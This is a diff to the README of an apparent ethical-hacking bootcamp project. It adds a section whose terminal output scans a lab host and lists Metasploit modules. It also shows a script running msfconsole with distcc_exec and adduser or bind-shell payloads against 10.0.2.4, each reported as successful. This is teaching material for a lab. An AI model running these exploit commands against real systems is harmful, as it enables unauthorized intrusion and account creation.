@@ -8,7 +8,7 @@ $ pip freeze > requirements.txt
 
 
 1. <a href="#port_scanner">Port Scanner</a>
-
+2. <a href="#exploits_and_payloads">Exploits and Payloads</a>
 
 
 ---
@@ -60,4 +60,53 @@ $ pip freeze > requirements.txt
     
     ```
 
+2. **Exploits and Payloads** <a name="exploits_and_payloads"></a>  
 
+    ```pycon
+    cd 2_exploits_and_payloads
+    ```
+   
+   ```pycon
+   ┌──(venv_EH)─(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/2_exploits_and_payloads]
+   └─$ sudo python service_info_3.py 
+   
+   [sudo] пароль для kali: 
+   {'PORT': '21/tcp', 'STATE': 'open', 'SERVICE': 'ftp', 'VERSION': 'vsftpd 2.3.4'}
+   ```
+
+   ```pycon
+   ┌──(venv_EH)─(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/2_exploits_and_payloads]
+   └─$ python3 get_exploits_MSF.py   
+           
+   exploit/windows/ssh/freeftpd_key_exchange
+   exploit/windows/ssh/freesshd_key_exchange
+   exploit/windows/ssh/freesshd_authbypass
+   exploit/windows/ssh/putty_msg_debug
+   exploit/windows/ssh/securecrt_ssh1
+   exploit/windows/ssh/sysax_ssh_username
+   exploit/multi/http/vmware_vcenter_uploadova_rce
+   exploit/windows/local/unquoted_service_path
+   exploit/windows/local/unquoted_service_path
+   ```
+   
+   ```pycon
+   ┌──(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/2_exploits_and_payloads]
+   └─$ python MSF_exploits_and_payloads_1.py
+   
+   Trying exploit:  exploit/unix/misc/distcc_exec
+   Trying payload:  payload/cmd/unix/adduser
+   Trying command:  msfconsole -q -x "use exploit/unix/misc/distcc_exec; set payload payload/cmd/unix/adduser; set RHOSTS 10.0.2.4; set RPORT 3632; set LHOST 10.0.2.5; check; exit"
+   [+] Successful exploitation:  exploit/unix/misc/distcc_exec, Payload: payload/cmd/unix/adduser
+   - - - - - - - - - - - - - - - - - - - - 
+   
+   Trying payload:  payload/cmd/unix/bind_perl
+   Trying command:  msfconsole -q -x "use exploit/unix/misc/distcc_exec; set payload payload/cmd/unix/bind_perl; set RHOSTS 10.0.2.4; set RPORT 3632; set LHOST 10.0.2.5; check; exit"
+   [+] Successful exploitation:  exploit/unix/misc/distcc_exec, Payload: payload/cmd/unix/bind_perl
+   - - - - - - - - - - - - - - - - - - - - 
+   
+   Trying payload:  payload/cmd/unix/bind_perl_ipv6
+   Trying command:  msfconsole -q -x "use exploit/unix/misc/distcc_exec; set payload payload/cmd/unix/bind_perl_ipv6; set RHOSTS 10.0.2.4; set RPORT 3632; set LHOST 10.0.2.5; check; exit"
+   [+] Successful exploitation:  exploit/unix/misc/distcc_exec, Payload: payload/cmd/unix/bind_perl_ipv6
+   - - - - - - - - - - - - - - - - - - - - 
+   
+   ```
